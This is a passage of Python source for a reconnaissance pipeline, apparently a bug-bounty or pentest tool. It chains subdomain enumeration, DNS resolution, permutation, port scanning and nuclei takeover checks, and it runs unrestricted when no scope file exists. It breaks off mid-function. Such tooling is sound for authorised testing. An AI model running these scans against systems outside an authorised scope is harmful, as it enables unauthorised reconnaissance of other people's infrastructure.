"""Phase implementations for ReconChain pipeline."""
from __future__ import annotations

import asyncio
import base64
import contextlib
import fnmatch
import hashlib
import json
import math
import os
import random
import re
import shlex
import shutil
import socket
import subprocess
import time
import urllib.parse
import urllib.request
import urllib.error
from datetime import datetime
from pathlib import Path
from typing import Any, Dict, List, Optional, Set, Tuple

from reconchain.config import VALID_PHASES, _SAFE_HOST
from reconchain.process import (
    _maybe_timeout, _USE_PROXYCHAINS, run_parallel,
    _PIPELINE_CFG, _run, _proxify_cmd, _update_nuclei_templates,
    _JOB_SEM,
)
from reconchain.tools import Tools
from reconchain.utils import (
    ensure, log, read_lines, iter_lines, read_jsonl, count_nonblank, merge_unique, merge_unique_incremental, merge_unique_str,
    _is_valid_hostname, _is_under_domain,
    _existing_artifacts,
    _get_urlopener, _get_no_redirect_urlopener, safe_suffix, _safe_name,
    _write_target_tokens,
    _extra_headers_dict, _extra_http_args,
    _async_urlopen, _async_urlopen_no_redirect,
    _dedupe_by_host_path, _dedupe_by_host_params,
    _parse_httpx_tech,
    _mmh3_hash,
    _extract_urls_from_ffuf_json, _merge_dnsx_output,
    _throttle_rate,
)
from reconchain.interactsh import Interactsh

MAX_RECV = 1_000_000  # 1 MB safety limit for socket recv loops


def _rate_limit_args(tool: str) -> List[str]:
    """Return rate-limit CLI flags for a tool based on _PIPELINE_CFG.

    Supported tools: httpx, katana, ffuf, nuclei, gau, httprobe.
    Returns an empty list when rate_limit is not set or tool is unsupported.
    """
    rl = getattr(_PIPELINE_CFG, "rate_limit", 0)
    if not rl:
        return []
    delay = getattr(_PIPELINE_CFG, "delay", 0.0)
    if tool == "httpx":
        return ["-rate-limit", str(rl)]
    if tool == "katana":
        return ["-rate-limit", str(rl)]
    if tool == "nuclei":
        return ["-rl", str(rl)]
    if tool == "ffuf":
        return ["-rate", str(rl)]
    if tool == "httprobe":
        # httprobe uses -c for concurrency; derive from rate_limit
        return ["-c", str(max(5, min(rl, 50)))]
    if tool == "gau":
        # gau uses --threads; derive from rate_limit
        return ["--threads", str(max(1, min(rl, 10)))]
    return []


# Phase-level globals
_SCOPE_FILE: Optional[Path] = None
_SCOPE_PATTERNS: List[str] = []
PhaseSet = Set[str]

_DEFAULT_RESOLVERS = [
    "1.1.1.1:53",
    "1.0.0.1:53",
    "8.8.8.8:53",
    "8.8.4.4:53",
    "9.9.9.9:53",
    "149.112.112.112:53",
    "208.67.222.222:53",
    "208.67.220.220:53",
    "185.228.168.9:53",
    "185.228.169.9:53",
    "76.76.19.19:53",
    "76.223.122.150:53",
]

def _ensure_resolver_file(path: Path) -> bool:
    """Create a default resolver file if it doesn't exist. Returns True if ready."""
    if path.exists():
        return True
    ensure(path)
    path.write_text("\n".join(_DEFAULT_RESOLVERS) + "\n")
    log("info", f"created default resolver list at {path} ({len(_DEFAULT_RESOLVERS)} resolvers)")
    return True

_PROXY_CLEAR_VARS = ["ALL_PROXY", "all_proxy", "HTTPS_PROXY", "https_proxy",
                     "HTTP_PROXY", "http_proxy", "PROXY"]

async def _run_cmd_clear_proxy(cmd: List[str], timeout: int = 10) -> Tuple[int, bytes, bytes]:
    """Run a subprocess command after clearing proxy env vars. Used for DNS
    and port-scan tools that must not go through SOCKS/HTTP proxy."""
    clean_env = {k: v for k, v in os.environ.items() if k not in _PROXY_CLEAR_VARS}
    sem = _JOB_SEM
    async def _do_run():
        try:
            proc = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE,
                env=clean_env,
            )
            stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=timeout)
            return proc.returncode or 0, stdout, stderr
        except asyncio.TimeoutError:
            try:
                proc.kill()
                await proc.wait()
            except Exception:
                pass
            return -1, b"", b""
    if sem is not None:
        async with sem:
            return await _do_run()
    return await _do_run()

def _extract_headers(s: str) -> Dict[str, str]:
    heads: Dict[str, str] = {}
    for ln in s.splitlines():
        if ":" in ln:
            k, v = ln.split(":", 1)
            heads[k.strip().lower()] = v.strip()
    return heads

def _request(host: str, path: str, timeout: int = 10) -> bytes:
    opener = _get_urlopener()
    url = host.rstrip("/") + "/" + path.lstrip("/")
    if not url.startswith("http"):
        url = "https://" + url
    try:
        resp = opener.open(url, timeout=timeout)
        data = resp.read(MAX_RECV)
        return data
    except Exception:
        pass
    return b""

def _norm_line(raw: str) -> str:
    raw = raw.strip()
    # Strip leading protocol-relative prefix (e.g. //evil.com → evil.com)
    while raw.startswith("//"):
        raw = raw[2:]
    while raw.count("//") > 1:
        raw = raw.replace("//", "/")
    return raw.rstrip("/")

_STATIC_EXT = frozenset({
    ".js", ".css", ".png", ".jpg", ".jpeg", ".svg", ".ico",
    ".woff", ".woff2", ".ttf", ".eot", ".webp", ".gif", ".pdf",
    ".json", ".xml", ".map", ".txt",
})

def _is_static_url(url: str) -> bool:
    path = urllib.parse.urlparse(url).path.lower()
    return any(path.endswith(ext) for ext in _STATIC_EXT)

_SKIP_PARAMS = frozenset({"v", "ver", "version", "id", "_", "t"})

_TOKEN_PARAM_RE = re.compile(
    r"^(?:"
    r"[0-9a-fA-F]{8,}"           # hex string (8+ chars)
    r"|[0-9a-fA-F-]{36}"         # UUID
    r"|[A-Za-z0-9+/=]{12,}"      # base64-like (12+ chars)
    r"|[A-Za-z0-9_-]{12,}"       # alphanumeric token (12+ chars)
    r")$"
)
def _normalize_url(url: str) -> str:
    parsed = urllib.parse.urlparse(url)
    qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
    norm_qs: Dict[str, List[str]] = {}
    for k in sorted(qs):
        vals = []
        for v in qs[k]:
            if _TOKEN_PARAM_RE.match(v):
                vals.append("_TOKEN_")
            else:
                vals.append(v)
        norm_qs[k] = vals
    new_qs = urllib.parse.urlencode(norm_qs, doseq=True)
    return urllib.parse.urlunparse(
        (parsed.scheme, parsed.netloc, parsed.path.rstrip("/"), "", new_qs, "")
    )

def _dedupe_by_normalized_url(urls: List[str]) -> List[str]:
    seen: Set[str] = set()
    result: List[str] = []
    for u in urls:
        norm = _normalize_url(u)
        if norm not in seen:
            seen.add(norm)
            result.append(u)
    return result

async def phase_00_SCOPE(
    domain: str, outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet,
    force: bool = False,
) -> Dict[str, Any]:
    if skip & {"00-SCOPE"}:
        return {}
    out = outdir / "scope_validated.txt"
    if out.exists() and not force:
        return {"00-SCOPE": str(out), "count": count_nonblank(out)}
    log("info", "Phase 00-SCOPE: scope validation")

    global _SCOPE_FILE, _SCOPE_PATTERNS
    scope_sources = [
        outdir / "scope.txt",
        outdir / "allowlist.txt",
        outdir / ".." / "scope.txt",
        Path.cwd() / "scope.txt",
        Path.cwd() / "allowlist.txt",
    ]
    scope_patterns: List[str] = []
    scope_file: Optional[Path] = None
    for sp in scope_sources:
        if sp.exists():
            scope_file = sp.resolve()
            scope_patterns = [ln.strip().lower() for ln in read_lines(sp) if ln.strip() and not ln.startswith("#")]
            if scope_patterns:
                log("ok", f"00-SCOPE: loaded {len(scope_patterns)} scope patterns from {scope_file}")
                break

    findings: List[str] = []
    if scope_patterns:
        _SCOPE_PATTERNS = scope_patterns
        _SCOPE_FILE = scope_file
        findings.append(f"scope_file={scope_file}")
        findings.append(f"scope_patterns={len(scope_patterns)}")
        for p in scope_patterns[:20]:
            findings.append(f"  pattern={p}")
        # Validate existing discovered assets against scope
        for asset_file in ("all_subs.txt", "resolved.txt", "hosts.txt", "host_targets.txt"):
            af = outdir / asset_file
            if af.exists():
                keep: List[str] = []
                dropped: List[str] = []
                for ln in read_lines(af):
                    h = ln.strip().lower().rstrip(".")
                    h = h.split("://")[-1].split("/")[0]  # strip scheme/path
                    in_scope = any(
                        fnmatch.fnmatch(h, pattern) or h.endswith("." + pattern.lstrip("*."))
                        for pattern in scope_patterns
                    )
                    (keep if in_scope else dropped).append(ln)
                if dropped:
                    findings.append(f"  {asset_file}: {len(dropped)} out-of-scope assets dropped")
                    for d in dropped[:10]:
                        findings.append(f"    dropped={d.strip()}")
                    af.write_text("\n".join(keep) + ("\n" if keep else ""))
                findings.append(f"  {asset_file}: {len(keep)} in-scope assets retained")
        findings.append("[scope] validation complete")
    else:
        findings.append("[scope] No scope file found — running unrestricted")
        _SCOPE_FILE = None
        _SCOPE_PATTERNS = []

    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"00-SCOPE: {len(findings)} scope findings → {out}")
    return {"00-SCOPE": str(out), "count": len(findings)}


async def phase_01_RECON(
    domain: str, outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet,
    resume: bool = False, force: bool = False
) -> Dict[str, Any]:
    if skip & {"01-RECON"}:
        return {}
    if only and "01-RECON" not in only:
        return {}
    out = outdir / "all_subs.txt"
    if out.exists() and not force:
        return {"01-RECON": str(out), "count": count_nonblank(out)}
    log("info", "Phase 01-RECON: subdomain enumeration")
    jobs: List[Tuple[str, List[str], int]] = []
    if t.has("subfinder"):
        _sub_out = outdir / "subs_subfinder.txt"
        if resume and _sub_out.exists() and count_nonblank(_sub_out) > 0:
            log("skip", "subfinder (resume — output exists)")
        else:
            _sub_proxy = []
            if _PIPELINE_CFG.proxy:
                _sub_proxy = ["-proxy", _PIPELINE_CFG.proxy]
            jobs.append(
                (
                    "subfinder",
                    ["subfinder", "-d", domain, "-silent", "-o", str(_sub_out)] + _sub_proxy,
                    900,
                )
            )
    if t.has("amass"):
        _amass_out = outdir / "subs_amass.txt"
        if resume and _amass_out.exists() and count_nonblank(_amass_out) > 0:
            log("skip", "amass (resume — output exists)")
        else:
            # amass v4: passive is the default (the old `-passive` flag is
            # deprecated) and `enum` emits *relationship* records on stdout, e.g.
            #   `sub.example.com (FQDN) --> a_record --> 1.2.3.4 (IPAddress)`
            # (the `-o` file holds the same raw terminal text, NOT a clean list).
            # Feeding those lines straight into the merge made every line fail the
            # hostname validator, so amass silently contributed zero subdomains.
            # Run via a runner that extracts the `<name> (FQDN)` tokens; the 01-RECON
            # merge's _under_domain validator then keeps only in-scope hosts.
            runner = outdir / "logs" / "amass.sh"
            ensure(runner)
            _amass_proxy_lines = ""
            if _PIPELINE_CFG.proxy:
                _amass_proxy_lines = f"export ALL_PROXY={shlex.quote(_PIPELINE_CFG.proxy)}\n"
            runner.write_text(
                "#!/usr/bin/env bash\n"
                "set -eu\n"
                "# DNS enumeration — clear proxy env so Go SOCKS doesn't slow DNS queries\n"
                "unset ALL_PROXY all_proxy HTTPS_PROXY https_proxy HTTP_PROXY http_proxy PROXY\n"
                f"{_amass_proxy_lines}"
                f"OUT={shlex.quote(str(_amass_out))}\n"
                f"DOMAIN={shlex.quote(domain)}\n"
                ': > "$OUT"\n'
                'amass enum -d "$DOMAIN" -nocolor '
                "| grep --line-buffered -oE '[A-Za-z0-9._-]+ \\(FQDN\\)' "
                "| sed 's/ (FQDN)$//' >> \"$OUT\"\n"
            )
            runner.chmod(0o700)
            jobs.append(("amass", ["bash", str(runner)], _maybe_timeout(600)))

    _a1_sources = [
        outdir / "subs_subfinder.txt",
        outdir / "subs_amass.txt",
    ]

    if not jobs:
        # Resume or all tools missing — merge any existing source files
        if any(p.exists() for p in _a1_sources):
            n = merge_unique(_a1_sources, out, validator=lambda s: _is_valid_hostname(s) and _is_under_domain(s, domain))
            if n == 0:
                out.touch()
            log("ok", f"01-RECON: {n} unique subdomains → {out}")
            return {"01-RECON": str(out), "count": n}
        log("warn", "01-RECON: no subdomain tools available")
        ensure(out)
        return {"01-RECON": str(out), "count": 0}

    # Incremental merge: while tools run, merge partial results into all_subs.txt
    # every 30s so downstream phases (02-RESOLVE, 04-SCAN, 05-HARVEST) can start early.
    def _under_domain(s: str) -> bool:
        return _is_valid_hostname(s) and _is_under_domain(s, domain)

    async def _incremental_merge() -> None:
        """Merge tool outputs into all_subs.txt every 30s during execution."""
        _last_mtimes: Dict[str, float] = {str(p): 0.0 for p in _a1_sources}
        _max_iterations = 120  # 120 * 30s = 1 hour max
        for _ in range(_max_iterations):
            await asyncio.sleep(30)
            changed = False
            for p in _a1_sources:
                if p.exists():
                    # Verify file is stable (not mid-write) to avoid partial reads
                    try:
                        size1 = p.stat().st_size
                        await asyncio.sleep(0.05)
                        size2 = p.stat().st_size
                        if size1 != size2:
                            continue
                    except OSError:
                        continue
                    mtime = p.stat().st_mtime
                    if mtime > _last_mtimes.get(str(p), 0.0):
                        changed = True
                        _last_mtimes[str(p)] = mtime
            if changed:
                merge_unique_incremental(_a1_sources, out, validator=_under_domain)

    merge_task = asyncio.create_task(_incremental_merge())
    try:
        results = await run_parallel(jobs, outdir)
    finally:
        merge_task.cancel()
        with contextlib.suppress(asyncio.CancelledError):
            await merge_task

    # Surface partial tool failures in summary.json (BUG-5). rc==0 and
    # skipped are not failures; anything else (timeouts, crash, signal)
    # is recorded so the user knows the merged output may be partial.
    failures = {r.name: r.rc for r in results if r.rc not in (0, None) and r.note != "skipped"}

    # Final merge
    n = merge_unique(_a1_sources, out, validator=_under_domain)
    if n == 0:
        out.touch()  # Empty file signals 01-RECON completed (no subs found)
    log("ok", f"01-RECON: {n} unique subdomains → {out}")
    ret: Dict[str, Any] = {"01-RECON": str(out), "count": n}
    if failures:
        ret["failures"] = failures
        log("warn", f"01-RECON: partial — failed tools: {failures}")
    return ret


async def phase_02_RESOLVE(
    domain: str,
    outdir: Path,
    t: Tools,
    only: PhaseSet,
    skip: PhaseSet,
    prev: Dict[str, Any],
    resume: bool = False,
    force: bool = False,
) -> Dict[str, Any]:
    if skip & {"02-RESOLVE"}:
        return {}
    if only and "02-RESOLVE" not in only:
        return {}
    out = outdir / "resolved.txt"
    full = outdir / "resolved_full.txt"
    if out.exists() and not force:
        return {"02-RESOLVE": str(out), "count": count_nonblank(out)}
    subs_file = Path(prev.get("01-RECON") or outdir / "all_subs.txt")

    # Fast check: if 01-RECON already finished (file exists), don't poll
    if not read_lines(subs_file, max_lines=1):
        is_done = isinstance(prev.get("01-RECON"), str) or subs_file.exists()
        if is_done:
            log("warn", "02-RESOLVE: 01-RECON produced no subdomains; skipping")
            out.touch()
            return {"02-RESOLVE": str(out), "count": 0}
        for _ in range(120):  # up to ~10 min
            await asyncio.sleep(5)
            if next(iter_lines(subs_file), None):
                break
        if not next(iter_lines(subs_file), None):
            log("warn", "02-RESOLVE: 01-RECON produced no subdomains; skipping")
            out.touch()
            return {"02-RESOLVE": str(out), "count": 0}

    log("info", "Phase 02-RESOLVE: resolution with parallel fallback (massdns → dnsx → dig)")
    _a2_processed: Set[str] = set()
    # Seed processed set from existing resolved file when resuming
    if resume:
        for ln in read_lines(out):
            h = ln.strip().lower()
            if h:
                _a2_processed.add(h)
    _a2_stable_count = 0

    # Run puredns on initial subdomains for wildcard-resistant resolution
    if t.has("puredns"):
        puredns_out = outdir / "resolved_puredns.txt"
        _puredns_resolvers = Path.home() / ".config" / "puredns" / "resolvers.txt"
        if _ensure_resolver_file(_puredns_resolvers):
            await _run(
                "puredns",
                ["puredns", "resolve", str(subs_file), "-w", str(puredns_out), "--skip-wildcard-filter"],
                1800, outdir,
            )
        if puredns_out.exists() and read_lines(puredns_out):
            existing = set()
            if out.exists():
                existing.update(ln.strip().lower() for ln in read_lines(out) if ln.strip())
            new_puredns: List[str] = []
            for ln in read_lines(puredns_out):
                host = ln.strip().lower()
                if host and _is_valid_hostname(host) and host not in existing:
                    existing.add(host)
                    new_puredns.append(host)
            if new_puredns:
                with out.open("a", encoding="utf-8") as f:
                    f.write("\n".join(new_puredns) + "\n")

    async def _resolve_socket(host: str) -> Optional[str]:
        """Fallback resolver using Python socket.getaddrinfo.
        Skips when SOCKS proxy is active without PySocks to avoid DNS leaks."""
        from reconchain.process import _USE_PROXYCHAINS, _PIPELINE_CFG
        from reconchain.utils import _socks_patched
        proxy = _PIPELINE_CFG.proxy or os.environ.get("PROXY", "")
        if proxy and not proxy.startswith(("http://", "https://")) and not _socks_patched:
            return None
        if _USE_PROXYCHAINS and not _socks_patched:
            return None
        try:
            await asyncio.get_event_loop().getaddrinfo(host, 0, family=socket.AF_UNSPEC)
            return host
        except Exception:
            return None

    async def _resolve_batch(hosts: List[str]) -> int:
        """Resolve subdomains with fallback chain: massdns → dnsx → socket."""
        hosts = [h for h in hosts if h not in _a2_processed]
        if not hosts:
            return 0
        _a2_processed.update(h.lower() for h in hosts)
        tmp = outdir / ".a2_batch.txt"
        tmp.write_text("\n".join(hosts) + "\n")
        resolved_count = 0
        # Try massdns first (fastest)
        if t.has("massdns"):
            massdns_out = outdir / ".a2_massdns_batch.txt"
            massdns_resolvers = Path.home() / ".config" / "massdns" / "resolvers.txt"
            if _ensure_resolver_file(massdns_resolvers):
                await _run(
                    "massdns",
                    ["massdns", "-r", str(massdns_resolvers), "-t", "A", "-o", "S",
                     "-w", str(massdns_out), str(tmp)],
                    600, outdir,
                )
                if massdns_out.exists() and read_lines(massdns_out):
                    for ln in read_lines(massdns_out):
                        if ln.strip() and " " in ln:
                            host = ln.split()[0].rstrip(".").lower()
                            if _is_valid_hostname(host) and host not in _a2_processed:
                                merge_unique_str(host, out)
                                merge_unique_str(host, full)
                                resolved_count += 1
                    massdns_out.unlink(missing_ok=True)
                    tmp.unlink(missing_ok=True)
                    return resolved_count
                massdns_out.unlink(missing_ok=True)
            else:
                log("warn", "massdns: no resolvers at ~/.config/massdns/resolvers.txt; trying dnsx")
        # Fall back to dnsx batch resolution
        if t.has("dnsx"):
            full_batch = outdir / ".a2_full_batch.txt"
            await _run(
                "dnsx",
                ["dnsx", "-silent", "-l", str(tmp), "-o", str(full_batch),
                 "-a", "-aaaa", "-cname", "-resp"],
                1800, outdir,
            )
            if full_batch.exists() and read_lines(full_batch):
                cnt = _merge_dnsx_output(full_batch, out, full)
                full_batch.unlink(missing_ok=True)
                tmp.unlink(missing_ok=True)
                return cnt
            full_batch.unlink(missing_ok=True)
        # Final fallback: Python socket resolution
        log("info", f"02-RESOLVE: resolving {len(hosts)} host(s) via socket fallback")
        tasks = [_resolve_socket(h) for h in hosts]
        results = await asyncio.gather(*tasks)
        resolved_hosts = [h for h in results if h is not None]
        if resolved_hosts:
            for host in resolved_hosts:
                merge_unique_str(host, out)
            resolved_count += len(resolved_hosts)
        tmp.unlink(missing_ok=True)
        return resolved_count

    async def _read_subs() -> List[str]:
        return [s.strip().lower() for s in read_lines(subs_file) if s.strip()]

    # Process initial available subdomains
    initial = await _read_subs()
    await _resolve_batch(initial)

    # Poll for new subdomains while 01-RECON may still be running (up to 10 min total)
    for _ in range(40):
        await asyncio.sleep(15)
        all_subs = await _read_subs()
        new_subs = [s for s in all_subs if s not in _a2_processed]
        if not new_subs:
            _a2_stable_count += 1
            if _a2_stable_count >= 4:
                break
            continue
        _a2_stable_count = 0
        await _resolve_batch(new_subs)

    c = count_nonblank(out)
    if c == 0:
        out.touch()
    return {"02-RESOLVE": str(out), "count": c}


async def phase_03_PERMUTE(
    domain: str, outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"03-PERMUTE"}:
        return {}
    if only and "03-PERMUTE" not in only:
        return {}
    _a3_stamp = outdir / f".phase_03.stamp.{os.getpid()}"
    if not force and any(outdir.glob(".phase_03.stamp.*")):
        _a3_out = outdir / "all_subs.txt"
        return {"01-RECON": str(_a3_out), "03-PERMUTE": str(_a3_out), "count": count_nonblank(_a3_out)}
    log("info", "Phase 03-PERMUTE: subdomain permutation (alterx → dnsgen → dnsx)")
    # Input: all discovered subdomains from 01-RECON (stable after Stage 0)
    subs_in = Path(prev.get("01-RECON") or outdir / "all_subs.txt")
    if not subs_in.exists() or not read_lines(subs_in):
        log("warn", "03-PERMUTE: no subdomains to permute; skipping")
        return {}
    permuted = outdir / "subs_permuted.txt"
    resolved = outdir / "subs_permuted_resolved.txt"
    all_subs = outdir / "all_subs.txt"
    alt_out = outdir / "subs_permuted_alterx.txt"
    jobs: List[Tuple[str, List[str], int]] = []
    if t.has("alterx"):
        runner = outdir / "logs" / "alterx_runner.sh"
        ensure(runner)
        runner.write_text(
            "#!/usr/bin/env bash\n"
            "set -eu\n"
            f"IN={shlex.quote(str(subs_in))}\n"
            f"OUT={shlex.quote(str(alt_out))}\n"
            "alterx -l \"$IN\" -silent -o \"$OUT\"\n"
            'head -500 "$OUT" > "${OUT}.tmp" && mv "${OUT}.tmp" "$OUT"\n'
        )
        runner.chmod(0o700)
        jobs.append(("alterx", ["bash", str(runner)], 600))
    if t.has("dnsgen"):
        runner = outdir / "logs" / "dnsgen_runner.sh"
        ensure(runner)
        runner.write_text(
            "#!/usr/bin/env bash\n"
            "set -eu\n"
            f"IN={shlex.quote(str(subs_in))}\n"
            f"OUT={shlex.quote(str(permuted))}\n"
            "dnsgen \"$IN\" | sort -u | head -500 > \"$OUT\"\n"
        )
        runner.chmod(0o700)
        jobs.append(("dnsgen", ["bash", str(runner)], 600))
    if jobs:
        await run_parallel(jobs, outdir)
    # Merge alterx results into subs_in so dnsx can also resolve them
    if alt_out.exists() and read_lines(alt_out):
        alt_hosts = [ln for ln in read_lines(alt_out) if _is_valid_hostname(ln)]
        if alt_hosts:
            tmp_alt = outdir / ".permuted_alterx_valid.txt"
            tmp_alt.write_text("\n".join(alt_hosts) + "\n")
            merge_unique([subs_in, tmp_alt], subs_in)
            tmp_alt.unlink(missing_ok=True)
    # Resolve permuted subdomains with dnsx (batched to avoid timeout on large sets)
    if permuted.exists() and read_lines(permuted) and t.has("dnsx"):
        all_raw = read_lines(permuted)
        all_permuted = [h for h in all_raw if _is_valid_hostname(h)]
        batch_size = 200
        resolved_all = outdir / "subs_permuted_resolved.txt"
        ensure(resolved_all).write_text("")
        batch_jobs = []
        for i in range(0, len(all_permuted), batch_size):
            batch = all_permuted[i:i + batch_size]
            batch_file = outdir / f".permuted_batch_{i}.txt"
            batch_file.write_text("\n".join(batch) + "\n")
            batch_out = outdir / f".permuted_batch_{i}_resolved.txt"
            batch_jobs.append((
                f"dnsx-permuted-{i}",
                ["dnsx", "-silent", "-l", str(batch_file),
                 "-o", str(batch_out), "-resp", "-a", "-aaaa"],
                _maybe_timeout(300),
            ))
        if batch_jobs:
            await run_parallel(batch_jobs, outdir)
            for i in range(0, len(all_permuted), batch_size):
                batch_out = outdir / f".permuted_batch_{i}_resolved.txt"
                if batch_out.exists() and read_lines(batch_out):
                    with resolved_all.open("a", encoding="utf-8") as f:
                        f.write("\n".join(read_lines(batch_out)) + "\n")
                batch_out.unlink(missing_ok=True)
                (outdir / f".permuted_batch_{i}.txt").unlink(missing_ok=True)
        resolved = resolved_all
    # Merge permuted results into the existing subdomain list
    merge_srcs = [subs_in]
    if resolved.exists() and read_lines(resolved):
        # dnsx -resp output: sub.example.com [A] [1.2.3.4] → extract host
        resolved_hosts = outdir / "subs_permuted_hosts.txt"
        clean: List[str] = []
        for ln in read_lines(resolved):
            parts = ln.split()
            if parts:
                host = parts[0].strip()
                if _is_valid_hostname(host) and _is_under_domain(host, domain):
                    clean.append(host)
        if clean:
            ensure(resolved_hosts).write_text("\n".join(set(clean)) + "\n")
            merge_srcs.append(resolved_hosts)
    n = merge_unique(merge_srcs, all_subs, lambda h: _is_under_domain(h, domain))
    _a3_stamp.write_text("")
    permuted.unlink(missing_ok=True)
    resolved.unlink(missing_ok=True)
    log("ok", f"03-PERMUTE: {n} total subdomains (after permutation)")
    return {"01-RECON": str(all_subs), "03-PERMUTE": str(all_subs), "count": n}


async def phase_04_SCAN(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"04-SCAN"}:
        return {}
    if only and "04-SCAN" not in only:
        return {}
    if all(
        (outdir / f).exists()
        for f in ("ports.txt", "hosts.txt", "host_targets.txt", "takeover.txt")
    ) and not force:
        ports_file = outdir / "ports.txt"
        return {
            "04-SCAN.ports": str(ports_file),
            "04-SCAN.hosts": str(outdir / "hosts.txt"),
            "04-SCAN.targets": str(outdir / "host_targets.txt"),
            "04-SCAN.takeover": str(outdir / "takeover.txt"),
            "count": count_nonblank(ports_file),
        }
    log("info", "Phase 04-SCAN: ports / hosts / takeover (parallel)")
    # naabu/httpx/nuclei-takeover accept host:port (or hosts from httpx)
    hosts = Path(prev.get("02-RESOLVE") or outdir / "resolved.txt")
    # nuclei takeover templates need CLEAN subdomains (no `[1.2.3.4]` suffix from dnsx -resp)
    subs = Path(prev.get("01-RECON") or outdir / "all_subs.txt")
    ports_file = outdir / "ports.txt"
    jobs: List[Tuple[str, List[str], int]] = []
    have_hosts = hosts.exists() and bool(read_lines(hosts))
    have_subs = subs.exists() and bool(read_lines(subs))
    if not have_hosts and not have_subs:
        for _ in range(240):
            await asyncio.sleep(5)
            have_hosts = hosts.exists() and bool(read_lines(hosts))
            have_subs = subs.exists() and bool(read_lines(subs))
            if have_hosts or have_subs:
                break
        if not have_hosts and not have_subs:
            log("warn", "04-SCAN: no host or subdomain input; skipping")
            return _existing_artifacts({
                "04-SCAN.ports": str(ports_file),
                "04-SCAN.hosts": str(outdir / "hosts.txt"),
                "04-SCAN.targets": str(outdir / "host_targets.txt"),
                "04-SCAN.takeover": str(outdir / "takeover.txt"),
            })
    if have_hosts and t.has("naabu"):
        jobs.append(
            (
                "naabu",
                [
                    "naabu", "-silent", "-l", str(hosts), "-o", str(ports_file),
                    "-top-ports", "1000",
                ],
                _maybe_timeout(1800),
            )
        )
        # UDP scanning not supported by naabu 2.x; skipped
    elif have_hosts and t.has("nmap"):
        _nmap_cmd = ["nmap", "-iL", str(hosts), "-Pn", "--top-ports", "1000", "--open",
                     "--script=http-enum", "-oG", str(outdir / "ports.gnmap")]
        jobs.append(("nmap", _nmap_cmd, _maybe_timeout(1800)))
    # DNS takeover check via nuclei (separate from http/takeovers)
    if t.has("nuclei"):
        await _update_nuclei_templates(outdir)
    if t.has("nuclei") and have_subs:
        # dns/ directory contains individual takeover templates (no dns/takeovers/ subdir)
        _nuc_proxy = []
        if _PIPELINE_CFG.proxy:
            _nuc_proxy = ["-proxy", _PIPELINE_CFG.proxy]
        jobs.append(
            (
                "nuclei-dns-takeover",
                [
                    "nuclei", "-silent", "-l", str(subs),
                    "-t", "dns/", "-tags", "takeover",
                    "-timeout", "15", "-max-host-error", "10",
                    "-o", str(outdir / "takeover_dns.txt"),
                ] + _nuc_proxy + _rate_limit_args("nuclei"),
                _maybe_timeout(1800),
            )
        )
    if have_hosts and t.has("httpx"):
        _httpx_proxy = []
        if _PIPELINE_CFG.proxy:
            _httpx_proxy = ["-proxy", _PIPELINE_CFG.proxy]
        jobs.append(
            (
                "httpx",
                 [
                    "httpx",
                    "-silent",
                    "-l",
                    str(hosts),
                    "-o",
                    str(outdir / "hosts.txt"),
                    "-title",
                    "-tech-detect",
                    "-status-code",
                    "-follow-redirects",
                ] + _extra_http_args() + _httpx_proxy + _rate_limit_args("httpx"),
                1800,
            )
        )
    if have_hosts and t.has("httprobe"):
        httprobe_out = outdir / "hosts_httprobe.txt"
        httprobe_runner = outdir / "logs" / "httprobe_runner.sh"
        ensure(httprobe_runner)
        _httprobe_conc = "50"
        _httprobe_rl = _rate_limit_args("httprobe")
        if _httprobe_rl:
            # Extract -c value from rate-limit args
            for i, a in enumerate(_httprobe_rl):
                if a == "-c" and i + 1 < len(_httprobe_rl):
                    _httprobe_conc = _httprobe_rl[i + 1]
        httprobe_runner.write_text(
            "#!/usr/bin/env bash\n"
            "set -eu\n"
            f"INPUT={shlex.quote(str(hosts))}\n"
            f"OUTPUT={shlex.quote(str(httprobe_out))}\n"
            f'cat "$INPUT" | httprobe -c {_httprobe_conc} -t 3000 > "$OUTPUT"\n'
        )
        httprobe_runner.chmod(0o700)
        jobs.append(
            (
                "httprobe",
                ["bash", str(httprobe_runner)],
                600,
            )
        )
    if have_hosts and t.has("nuclei"):
        _nuc_proxy = []
        if _PIPELINE_CFG.proxy:
            _nuc_proxy = ["-proxy", _PIPELINE_CFG.proxy]
        jobs.append(
            (
                "nuclei-takeover",
                [
                    "nuclei",
                    "-silent",
                    "-l",
                    str(hosts),
                    "-t",
                    "http/takeovers",
                    "-timeout", "30", "-max-host-error", "10",
                    "-o",
                    str(outdir / "takeover.txt"),
                ] + _extra_http_args() + _nuc_proxy + _rate_limit_args("nuclei"),
                _maybe_timeout(1800),
            )
        )
    if jobs:
        await run_parallel(jobs, outdir)
    # Deduplicate naabu port output (naabu can emit duplicates)
    if ports_file.exists():
        _deduped = sorted(set(read_lines(ports_file)))
        if _deduped:
            ensure(ports_file).write_text("\n".join(_deduped) + "\n")
    # Merge httprobe results into hosts.txt
    httprobe_out = outdir / "hosts_httprobe.txt"
    hosts_file_path = outdir / "hosts.txt"
    if httprobe_out.exists() and read_lines(httprobe_out) and hosts_file_path.exists():
        merge_unique([httprobe_out], hosts_file_path)
    # ── Service version detection ─────────────────────────────────────
    # If naabu found ports and nmap is available, run nmap -sV on the
    # discovered host:port pairs to detect service versions (Apache,
    # nginx, OpenSSH, etc.) and write a services.txt artifact.
    services_file = outdir / "services.txt"
    if ports_file.exists() and read_lines(ports_file) and t.has("nmap"):
        sv_jobs: List[Tuple[str, List[str], int]] = []
        # Group by host to batch nmap calls (faster than 1 port per call)
        host_ports: Dict[str, List[str]] = {}
        for ln in read_lines(ports_file):
            if ":" in ln:
                h, p = ln.rsplit(":", 1)
                host_ports.setdefault(h, []).append(p)
        for h, pp in host_ports.items():
            ports_csv = ",".join(pp)
            out_sv = outdir / f"services_{safe_suffix(h)}.gnmap"
            _sv_cmd = ["nmap", "-Pn", "-sV", "--open",
                       "-p", ports_csv, str(h), "--host-timeout", "10m", "-oG", str(out_sv)]
